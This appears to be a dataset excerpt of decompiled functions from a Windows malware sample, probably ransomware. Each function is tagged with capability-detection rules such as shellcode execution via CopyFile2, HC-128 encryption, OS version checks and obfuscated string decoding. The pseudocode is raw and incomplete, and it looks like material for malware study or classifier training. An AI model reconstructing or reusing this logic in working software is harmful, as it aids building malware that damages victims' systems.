fcn.0040beb2(puVar3 + 199, uVar4, puVar6);\n        if (s == 6) {\n            puVar6 = &lpBuffer;\n            uVar4 = fcn.0040a88f(0x418318, 0x30, 0xa3ec928e, 0);\n            fcn.0040beb2(puVar3 + 0x108, uVar4, puVar6);\n            puVar6 = &lpBuffer;\n            uVar4 = fcn.0040a88f(0x418350, 0x40, 0xc6e8626b, 0);\n            fcn.0040beb2(puVar3 + 0x149, uVar4, puVar6);\n        }\n        sub.ntdll.dll_memcpy(puVar3 + 0x18a, fcn.00404c76, 0x800);\n        iVar5 = fcn.0040c40d();\n        if (iVar5 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(&var_538h, 0x104);\n            uVar4 = extraout_ECX_01;\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_GetSystemWow64DirectoryW)();\n            uVar4 = extraout_ECX_00;\n        }\n        puVar6 = &var_538h;\n        uVar4 = fcn.0040acd8(0x418394, 0x11, 0xb3a07e27, uVar4);\n        fcn.0040be75(0x41d6d0, uVar4, puVar6);\n        *0x41c838 = *0x4177f8;\n        *0x41c83c = *0x4177fc;\n        *0x41c840 = *0x417800;\n        *0x41c844 = str.__t_v._0_4_;\n        *0x41c848 = *0x4177d8;\n        *0x41c84c = *0x4177dc;\n        *0x41c850 = *0x4177e0;\n        *0x41c854 = *0x4177e4;\n        *0x41c858 = *0x4177b8;\n        *0x41c85c = *0x4177bc;\n        *0x41c860 = *0x4177c0;\n        *0x41c864 = *0x4177c4;\n        *0x41c814 = _sym.imp.ole32.dll_CoInitializeEx;\n        *0x41c818 = _sym.imp.ole32.dll_CoCreateInstance;\n        uVar4 = fcn.0040a88f(0x4183a8, 0x1b, 0x61a0c66b, 0);\n        uVar4 = fcn.0040acd8(0x4183c4, 0xb, 0xdceeb2d2, extraout_ECX_02, uVar4);\n        uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(uVar4);\n        *0x41c81c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        *0x41c820 = _sym.imp.SHELL32.dll_ShellExecuteExW;\n        *0x41c824 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n        *0x41c830 = _sym.imp.KERNEL32.dll_CloseHandle;\n        *0x41c828 = _sym.imp.KERNEL32.dll_SetEvent;\n        *0x41c82c = _sym.imp.KERNEL32.dll_OpenEventW;\n        *0x41c834 = uVar1;\n        fcn.0040d968(0x96, 0xff);\n        *0x41d6c8 = (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 0, 0, 0x41c6e8);\n        *0x41d8d8 = *0x41d8e4;\n        *0x41c6e4 = fcn.0040f347();\n        var_4h = fcn.0040acd8(0x417b70, 5, 0xbbed6ef6);\n        fcn.0040cec3(0x41c868, &var_4h, 1, 4, fcn.00405673, 0, 1, 0);\n        uVar2 = fcn.0040c13c();\n    }\n    return uVar2 & 0xffffff00;\n}\n",
        "token_count": 1636
    },
    "0040f089": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f089(uint pbBinary, uint cbBinary, char *pszString)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t pcchString;\n    \n    pcchString = in_EAX;\n    iVar2 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(pbBinary, cbBinary, 0x80000001, pszString, &pcchString);\n    pcVar3 = pszString;\n    iVar1 = pcchString;\n    if (iVar2 != 0) {\n        for (; iVar2 = iVar1,  pcchString != 0; pcchString = pcchString + -1) {\n            if (*pcVar3 == '\\n') {\n                iVar2 = iVar2 + -1;\n                if (pcchString + -1 == 0) break;\n                (*_sym.imp.ntdll.dll_memmove)(pcVar3, pcVar3 + 1, pcchString + -1);\n            }\n            else {\n                pcVar3 = pcVar3 + 1;\n            }\n            iVar1 = iVar2;\n        }\n        pszString[iVar2] = '\\0';\n    }\n    return iVar2;\n}\n",
        "token_count": 279
    },
    "0040fc12": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040fc12(uint32_t param_1, char param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = -1;\n    if ((param_2 - 0x30U < 10) && (param_2 <= param_1 + 0x2f)) {\n        iVar1 = param_2 - 0x30;\n    }\n    else if (10 < param_1) {\n        if ((param_2 + 0xbfU < 0x1a) && (param_2 <= param_1 + 0x36)) {\n            iVar1 = param_2 - 0x37;\n        }\n        if ((param_2 + 0x9fU < 0x1a) && (param_2 <= param_1 + 0x56)) {\n            iVar1 = param_2 - 0x57;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 209
    },
    "0040313f": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuchar fcn.0040313f(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    var_18h = 0x402d9d;\n    var_14h = 0x402da0;\n    var_10h = 0x402e8a;\n    var_ch = 0x402f50;\n    var_8h = fcn.0040318d;\n    var_4h = 0x4033d1;\n    uVar2 = 0;\n    do {\n        cVar1 = (*(&var_18h)[uVar2])();\n        if (cVar1 != '\\0') {\n            return 1;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 6);\n    return 0;\n}\n",
        "token_count": 223
    },
    "00408f0a": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.00408f0a(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint var_738h;\n    uint var_530h;\n    uint lpBuffer;\n    uint lpVersionInformation;\n    int32_t var_11ch;\n    uint var_4h;\n    \n    fcn.0040c920(&var_4h);\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&lpBuffer, 0x104);\n    uVar2 = fcn.0040acd8(0x418978, 0xf, 0xa9bfaeb6, extraout_ECX, &lpBuffer);\n    pcVar1 = _sym.imp.USER32.dll_wsprintfW;\n    (*_sym.imp.USER32.dll_wsprintfW)(&var_530h, uVar2);\n    uVar2 = fcn.0040acd8(0x418988, 0x1a, 0x7e3fbab9);\n    fcn.00408e33(&var_530h, uVar2);\n    uVar2 = fcn.0040acd8(0x4189a4, 0x10, 0xa428a083, uVar2, &lpBuffer);\n    (*pcVar1)(&var_738h, uVar2);\n    uVar2 = fcn.0040acd8(0x4189b8, 0x11, 0x1dbf46be);\n    fcn.00408e33(&var_738h, uVar2);\n    sub.ntdll.dll_memset(&var_11ch, 0, 0x110);\n    lpVersionInformation = 0x114;\n    (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n    if (var_11ch == 6) {\n        uVar2 = fcn.0040acd8(0x4189cc, 0x21, 0x1f25273c);\n        uVar3 = fcn.0040acd8(0x4189f0, 0xb, 0x7a1b5e75, extraout_ECX_00);\n        fcn.00408e33(uVar3, uVar2);\n        uVar2 = fcn.0040acd8(0x4189fc, 0x31, 0x7f4ee897);\n        uVar3 = fcn.0040acd8(0x4189f0, 0xb, 0x7a1b5e75, extraout_ECX_01);\n        fcn.00408e33(uVar3, uVar2);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return;\n}\n",
        "token_count": 656
    },
    "00409195": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409195(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_160h;\n    uint32_t s;\n    uint pExecInfo;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x118);\n    fcn.0040f255();\n    if (s < 6) {\n        return;\n    }\n    var_1h._0_1_ = '\\x01';\n    cVar1 = fcn.0040911c();\n    if (cVar1 == '\\0') {\n        sub.ntdll.dll_memset(&var_3ch, 0, 0x38);\n        pExecInfo = 0x3c;\n        var_3ch = 0xc400;\n        var_34h = fcn.0040acd8(0x418240, 5, 0x4d3fe08e);\n        var_30h = 0x41dc10;\n        var_38h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        var_24h = 1;\n        iVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n        if ((iVar2 != 0) && (var_8h != 0)) {\n            var_1h._0_1_ = '\\0';\n        }\n        cVar1 = fcn.004090a9();\n        if (cVar1 != '\\0') {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n        if (var_1h == '\\0') goto code_r0x00409268;\n    }\n    cVar1 = fcn.004056d9();\n    if (cVar1 == '\\0') {\n        fcn.004046e8();\n        return;\n    }\ncode_r0x00409268:\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x409109, 0, 0, 0);\n    fcn.0040c13c();\n    return;\n}\n",
        "token_count": 529
    },
    "0040c762": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.0040c762(void)\n\n{\n    int32_t iVar1;\n    uint lpVersionInformation;\n    uint32_t s;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x110);\n    lpVersionInformation = 0x114;\n    (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n    if (s < 6) {\n        iVar1 = fcn.0040bb38();\n    }\n    else {\n        iVar1 = fcn.0040bb38();\n        if (iVar1 == 0) {\n            return false;\n        }\n        iVar1 = fcn.0040bc95();\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 156
    },
    "00403ea6": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00403ea6(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar4 = fcn.0040acd8(str.zfeY, 0xc, 0x15623934, param_1, &var_4h);\n    iVar5 = fcn.00403e75(uVar4);\n    if (iVar5 != 0) {\n        *0x41c6ac = fcn.0040e6b7(var_4h);\n        if (*0x41c6ac != 0) {\n            cVar3 = fcn.0040e1c6();\n            if (cVar3 == '\\0') {\n                *0x41c6c8 = 0;\n            }\n            else {\n                *0x41c6c8 = fcn.004137b1();\n            }\n            uVar2 = *0x41c6b0;\n            uVar7 = *0x41c6b0 & 0xffff;\n            uVar6 = (*0x41c6c8 >> 3) - 1 & 0xffff;\n            uVar1 = uVar6 - 0x17;\n            *0x41c6b0 = *0x41c6b0 & 0xffff0000 | uVar1 & 0xffff;\n            if (uVar7 <= uVar1) {\n                *0x41c6b0 = uVar2;\n            }\n            *0x41c6b8 = (uVar6 - *0x41c6b0) - 0x17;\n            *0x41c68c = *0x41c6b8 + 0x17 + (*0x41c6b0 & 0xffff);\n            var_4h = 0;\n            uVar4 = fcn.0040acd8(0x418160, 0xc, 0xaa34ef4f, *0x41c6b0 & 0xffff, &var_4h);\n            iVar5 = fcn.00403e75(uVar4);\n            if (iVar5 != 0) {\n                fcn.0040ee5a(iVar5, var_4h, 0x41c6d0);\n                *0x41c6b4 = fcn.0040f021(iVar5, 0x41c698);\n                fcn.0040af12();\n            }\n            if (*0x41c6b4 == 0) {\n                fcn.0040e375();\n                *0x41c6ac = 0;\n            }\n        }\n        fcn.0040af12();\n    }\n    return *0x41c6ac != 0;\n}\n",
        "token_count": 668
    },
    "004043aa": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004043aa(uint hKey)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint pdwDataLen;\n    int32_t pbData;\n    \n    uVar2 = 0;\n    pbData = 0;\n    pdwDataLen = 4;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptGetKeyParam)(hKey, 9, &pbData, &pdwDataLen, 0);\n    if (iVar1 != 0) {\n        uVar2 = pbData + 7U >> 3;\n    }\n    return uVar2;\n}\n",
        "token_count": 143
    },
    "0040e3cb": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e3cb(int32_t *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    cVar1 = fcn.0040e1c6();\n    if (cVar1 == '\\0') {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = 0;\n        if (*arg_8h == 2) {\n            *arg_ch = 0x201049a;\n            arg_ch[3] = 2;\n            iVar2 = fcn.004137b1();\n            uVar4 = iVar2 + 7U >> 3;\n            arg_ch[2] = iVar2;\n            iVar2 = fcn.0040ae05(0);\n            fcn.004112e1(iVar2, uVar4);\n            arg_ch[4] = *(iVar2 + -4 + uVar4);\n            fcn.0040af12();\n            fcn.004112e1(arg_ch + 5, uVar4);\n            uVar3 = fcn.0040d9de();\n            arg_ch[1] = uVar3;\n            fcn.004112e1(arg_ch + 5 + uVar4, uVar4);\n            iVar2 = uVar4 * 2 + 0x18;\n        }\n        else if (*arg_8h == 1) {\n            *arg_ch = 0x201049a;\n            arg_ch[3] = 1;\n            iVar2 = fcn.004137b1();\n            uVar4 = iVar2 + 7U >> 3;\n            arg_ch[2] = iVar2;\n            iVar2 = fcn.0040ae05(0);\n            fcn.004112e1(iVar2, uVar4);\n            arg_ch[4] = *(iVar2 + -4 + uVar4);\n            fcn.0040af12();\n            fcn.004112e1(arg_ch + 5, uVar4);\n            uVar3 = fcn.0040d9de();\n            arg_ch[1] = uVar3;\n            iVar2 = uVar4 + 0x18;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 515
    },
    "0040e5bc": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint * fcn.0040e5bc(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    puVar4 = NULL;\n    uVar3 = *(param_1 + 8) + 7U >> 3;\n    if (*(param_1 + 0xc) == 1) {\n        if (param_2 == uVar3 + 0x18) {\n            puVar4 = fcn.0040ae05(8);\n            if (puVar4 != NULL) {\n                *puVar4 = 1;\n                uVar1 = fcn.004111b4();\n                puVar4[2] = uVar1;\n                iVar2 = fcn.0040ae05(8);\n                *(iVar2 + -4 + uVar3) = *(param_1 + 0x10);\n                fcn.004112a9(iVar2, uVar3);\n                fcn.0040af12();\n                uVar1 = fcn.004111b4();\n                puVar4[1] = uVar1;\n                fcn.004112a9(param_1 + 0x14, uVar3);\n            }\n        }\n    }\n    else if ((*(param_1 + 0xc) == 2) && (param_2 == uVar3 * 2 + 0x18)) {\n        puVar4 = fcn.0040ae05(8);\n        if (puVar4 != NULL) {\n            *puVar4 = 2;\n            uVar1 = fcn.004111b4();\n            puVar4[2] = uVar1;\n            iVar2 = fcn.0040ae05(8);\n            *(iVar2 + -4 + uVar3) = *(param_1 + 0x10);\n            fcn.004112a9(iVar2, uVar3);\n            fcn.0040af12();\n            uVar1 = fcn.004111b4();\n            puVar4[1] = uVar1;\n            fcn.004112a9(param_1 + 0x14, uVar3);\n            uVar1 = fcn.004111b4();\n            puVar4[3] = uVar1;\n            fcn.004112a9(param_1 + 0x14 + uVar3, uVar3);\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 553
    },
    "0040e6f8": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e6f8(int32_t s2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t unaff_ESI;\n    uint32_t var_4h;\n    \n    uVar2 = *(unaff_ESI + 0x10) + in_EAX * 8;\n    uVar1 = *(unaff_ESI + 0x10) >> 3 & 0x3f;\n    *(unaff_ESI + 0x10) = uVar2;\n    if (uVar2 < in_EAX << 3) {\n        *(unaff_ESI + 0x14) = *(unaff_ESI + 0x14) + 1;\n    }\n    *(unaff_ESI + 0x14) = *(unaff_ESI + 0x14) + (in_EAX >> 0x1d);\n    var_4h = -uVar1 + 0x40;\n    if (in_EAX < var_4h) {\n        var_4h = 0;\n    }\n    else {\n        sub.ntdll.dll_memcpy(uVar1 + 0x18 + unaff_ESI, s2, var_4h);\n        fcn.0040e78c(unaff_ESI);\n        for (uVar2 = -uVar1 + 0x7f; uVar2 < in_EAX; uVar2 = uVar2 + 0x40) {\n            fcn.0040e78c(unaff_ESI);\n            var_4h = var_4h + 0x40;\n        }\n        uVar1 = 0;\n    }\n    sub.ntdll.dll_memcpy(uVar1 + 0x18 + unaff_ESI, var_4h + s2, in_EAX - var_4h);\n    return;\n}\n",
        "token_count": 419
    },
    "0040ee5a": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ee5a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_ch;\n    \n    uVar2 = 0;\n    cVar1 = fcn.0040f84a(arg_8h, arg_ch);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040f871(arg_10h, 0x10),  cVar1 != '\\0')) {\n        var_50h = 0;\n        var_54h = 0;\n        var_64h = 0x67452301;\n        var_60h = 0xefcdab89;\n        var_5ch = 0x98badcfe;\n        var_58h = 0x10325476;\n        fcn.0040e6f8(arg_8h);\n        fcn.0040ee25(&var_54h);\n        fcn.0040e6f8(0x41b820);\n        fcn.0040e6f8(&var_ch);\n        fcn.0040ee25(&var_64h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 322
    },
    "00412138": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00412138(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_10h != 0) {\n        uVar5 = 0;\n        uVar3 = in_EAX & 7;\n        uVar4 = 0;\n        if (uVar3 != 0) {\n            uVar5 = *((in_EAX >> 3) + arg_8h) >> (8U - uVar3 & 0x1f);\n            uVar4 = uVar3;\n        }\n        var_8h = in_EAX >> 3;\n        uVar3 = arg_10h + 7 >> 3;\n        iVar6 = 0;\n        if (uVar3 != 0) {\n            do {\n                if (iVar6 == uVar3 - 1) {\n                    var_4h = 8;\n                    if ((arg_10h & 7) != 0) {\n                        var_4h = arg_10h & 7;\n                    }\n                    uVar2 = *(iVar6 + arg_ch) >> (8 - var_4h & 0x1f) | uVar5 << var_4h;\n                    uVar4 = uVar4 + var_4h;\n                }\n                else {\n                    uVar2 = *(iVar6 + arg_ch) ^ uVar5 << 8;\n                    uVar4 = uVar4 + 8;\n                }\n                uVar5 = uVar2;\n                while ((iVar6 != uVar3 - 1 && 7 < uVar4 || (0 < uVar4 && iVar6 == uVar3 - 1))) {\n                    var_4h = 8;\n                    if (uVar4 < 9) {\n                        var_4h = uVar4;\n                    }\n                    cVar1 = uVar4;\n                    uVar4 = uVar4 - var_4h;\n                    *(var_8h + arg_8h) =\n                         (uVar2 >> (cVar1 - var_4h & 0x1f)) << (8 - var_4h & 0x1f) & 0xff00 >> (var_4h & 0x1f);\n                    var_8h = var_8h + 1;\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 633
    },
    "00412505": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00412505(int32_t s2, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t arg_10h_00;\n    int32_t unaff_ESI;\n    int32_t iVar3;\n    uint32_t var_4h;\n    \n    if (unaff_ESI == 0) {\n        iVar3 = 3;\n    }\n    else if (*(unaff_ESI + 0x10c) == 0) {\n        iVar3 = 5;\n    }\n    else if (s2 == 0) {\n        iVar3 = 8;\n    }\n    else {\n        var_4h = 0;\n        if ((arg_10h != 0) || (arg_ch != 0)) {\n            do {\n                arg_10h_00 = 0x1000 - *(unaff_ESI + 0x3b7c);\n                if ((arg_10h == arg_ch < var_4h) && (arg_ch - var_4h < arg_10h_00)) {\n                    arg_10h_00 = arg_ch - var_4h;\n                }\n                if ((((arg_10h_00 & 7) == 0) && ((*(unaff_ESI + 0x3b7c) & 7) == 0)) && ((var_4h & 7) == 0)) {\n                    sub.ntdll.dll_memcpy\n                              ((*(unaff_ESI + 0x3b7c) >> 3) + 0x378 + unaff_ESI, (var_4h >> 3) + s2, arg_10h_00 >> 3);\n                }\n                else {\n                    fcn.00412138(unaff_ESI + 0x378, (var_4h >> 3) + s2, arg_10h_00);\n                }\n                var_4h = var_4h + arg_10h_00;\n                *(unaff_ESI + 0x3b7c) = *(unaff_ESI + 0x3b7c) + arg_10h_00;\n                puVar1 = unaff_ESI + 0x110;\n                uVar2 = *puVar1;\n                *puVar1 = *puVar1 + arg_10h_00;\n                *(unaff_ESI + 0x114) = *(unaff_ESI + 0x114) + CARRY4(uVar2, arg_10h_00);\n                if (((*(unaff_ESI + 0x3b7c) == 0x1000) && ((arg_10h != 0 || (var_4h < arg_ch)))) &&\n                   (iVar3 = fcn.004123ac(unaff_ESI, 1, 0),  iVar3 != 0)) {\n                    return iVar3;\n                }\n            } while ((arg_10h != 0) || (var_4h < arg_ch));\n        }\n        iVar3 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 691
    },
    "00413be2": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00413be2(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    iVar2 = fcn.004137b1();\n    uVar3 = iVar2 + 7U >> 3;\n    uVar4 = 0;\n    iVar2 = arg_14h + -1;\n    if (arg_ch != 0) {\n        do {\n            if (iVar2 < 0) {\n                return uVar3;\n            }\n            uVar1 = *(arg_8h + uVar4 * 4);\n            arg_14h = 0;\n            do {\n                if (0x1f < arg_14h) break;\n                *(iVar2 + arg_10h) = uVar1 >> (arg_14h & 0x1f);\n                iVar2 = iVar2 + -1;\n                arg_14h = arg_14h + 8;\n            } while (-1 < iVar2);\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < arg_ch);\n    }\n    for (; -1 < iVar2; iVar2 = iVar2 + -1) {\n        *(iVar2 + arg_10h) = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 326
    },
    "004062b5": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.004062b5(void)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uStack668;\n    uint uStack664;\n    uint uStack660;\n    uint uStack656;\n    uchar *puStack652;\n    uint uStack632;\n    code *pcStack628;\n    uchar auStack580 [4];\n    uint uStack576;\n    uint uStack564;\n    uchar auStack548 [4];\n    uchar *puStack544;\n    uchar auStack536 [532];\n    \n    pcStack628 = 0x100;\n    uStack632 = 0x4062d0;\n    uStack632 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)();\n    (*_sym.imp.KERNEL32.dll_SetThreadPriority)();\n    pcVar1 = _sym.imp.KERNEL32.dll_SetProcessShutdownParameters;\n    iVar3 = (*_sym.imp.KERNEL32.dll_SetProcessShutdownParameters)();\n    if (iVar3 == 0) {\n        puStack652 = 0x4062f4;\n        iVar3 = (*pcVar1)();\n        if (iVar3 == 0) {\n            puStack652 = 0x406300;\n            (*pcVar1)();\n        }\n    }\n    puStack652 = &stack0xfffffdbc;\n    uStack656 = 0x40630f;\n    sub.ntdll.dll_memset();\n    puStack544 = &stack0xfffffde8;\n    uStack576 = 0x40f613;\n    uStack564 = 0x400000;\n    do {\n        puStack652 = 0x406341;\n        fcn.0040d968(0x100, 0xff);\n        iVar2 = (*_sym.imp.USER32.dll_RegisterClassExW)();\n    } while (iVar2 == 0);\n    puStack652 = 0x406361;\n    (*_sym.imp.USER32.dll_UnregisterClassW)();\n    puStack652 = &stack0xfffffd88;\n    uStack632 = 0;\n    pcStack628 = fcn.00406293;\n    uStack660 = 0;\n    uStack656 = 0x4063a1;\n    (*_sym.imp.USER32.dll_RegisterClassW)();\n    uStack656 = 0;\n    uStack664 = 0;\n    uStack668 = 0;\n    uVar4 = (*_sym.imp.USER32.dll_CreateWindowExW)(0, &stack0xfffffddc, 0, 0x4cf0000, 1, 1, 1, 1);\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_PeekMessageW)(&stack0xfffffd7c, uVar4, 0, 0, 1);\n        if (iVar3 != 0) {\n            (*_sym.imp.USER32.dll_TranslateMessage)(&stack0xfffffd68);\n            (*_sym.imp.USER32.dll_DispatchMessageW)(&stack0xfffffd64);\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41d8e0, 1);\n    } while (iVar3 == 0x102);\n    return;\n}\n",
        "token_count": 702
    },
    "00405a0c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00405a0c(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    \n    if ((*0x41e81c & 1) == 0) {\n        *0x41e81c = *0x41e81c | 1;\n        *0x41e7a0 = fcn.0040acd8(0x4184c4, 6, 0xc8d7f964);\n        *0x41e7a4 = fcn.0040acd8(0x4184bc, 5, 0xbaaf3c70);\n        *0x41e7a8 = fcn.0040acd8(0x4184b4, 7, 0xdd3d943a);\n        *0x41e7ac = fcn.0040acd8(0x4184ac, 7, 0x19d5ff74);\n        *0x41e7b0 = fcn.0040acd8(0x4184a4, 6, 0x9b2e6fc4);\n        *0x41e7b4 = fcn.0040acd8(0x41849c, 4, 0x4e5c9e54);\n        *0x41e7b8 = fcn.0040acd8(str.N69_H, 7, 0xdb3982c8);\n        *0x41e7bc = fcn.0040acd8(str.p__, 8, 0x91f132a9);\n        *0x41e7c0 = fcn.0040acd8(0x41847c, 8, 0xc8bd333d);\n        *0x41e7c4 = fcn.0040acd8(0x418470, 8, 0xe0d39ea6);\n        *0x41e7c8 = fcn.0040acd8(0x418468, 5, 0x1ffe3c46);\n        *0x41e7cc = fcn.0040acd8(0x418460, 4, 0x285ed8fe);\n        *0x41e7d0 = fcn.0040acd8(0x418458, 6, 0x4e724ad0);\n        *0x41e7d4 = fcn.0040acd8(0x418450, 7, 0xd46f26db);\n        *0x41e7d8 = fcn.0040acd8(0x418448, 4, 0x7c7fe090);\n        *0x41e7dc = fcn.0040acd8(0x418440, 5, 0x2c1e9017);\n        *0x41e7e0 = fcn.0040acd8(0x418438, 7, 0x3c43237b);\n        *0x41e7e4 = fcn.0040acd8(0x418430, 6, 0x3047922b);\n        *0x41e7e8 = fcn.0040acd8(0x418428, 5, 0x56c37e2e);\n        *0x41e7ec = fcn.0040acd8(0x418420, 7, 0x7ef63976);\n        *0x41e7f0 = fcn.0040acd8(0x418414, 8, 0x475d5047);\n        *0x41e7f4 = fcn.0040acd8(0x41840c, 4, 0x825ad251);\n        *0x41e7f8 = fcn.0040acd8(0x418404, 6, 0xc2d63732);\n        *0x41e7fc = fcn.0040acd8(0x4183fc, 6, 0x57e1ebb5);\n        *0x41e800 = fcn.0040acd8(0x4183f4, 4, 0x951e3312);\n        *0x41e804 = fcn.0040acd8(0x4183ec, 7, 0xfb28c940);\n        *0x41e808 = fcn.0040acd8(0x4183e4, 7, 0x83b8eff0);\n        *0x41e80c = fcn.0040acd8(0x4183e0, 3, 0x62f99f7f);\n        *0x41e810 = fcn.0040acd8(0x4183d8, 5, 